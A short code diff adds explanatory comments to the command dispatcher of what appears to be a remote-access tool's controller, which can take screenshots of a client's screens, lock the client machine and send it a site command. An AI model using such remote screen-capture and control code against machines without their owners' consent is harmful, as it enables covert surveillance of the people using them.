@@ -272,12 +272,15 @@ def send_commands():
             strSite = 'site' + strChoice[4:]
             send(str.encode(strSite))
 
+        # --p: Used for taking screenshot from all screens on the Client
         elif strChoice == '--p' or strChoice == 'screenshot':
             screenshot()
 
+        # --p 1: Used for taking screenshot from only Primary screen on the Client
         elif strChoice == '--p 1' or strChoice == 'primary_screenshoot':
             screenshot(all_monitors=False)
 
+        # --x 1: Used for Locking the Client Machine
         elif strChoice == '--x 1' or strChoice == 'lock':
             send(b'lock')
 
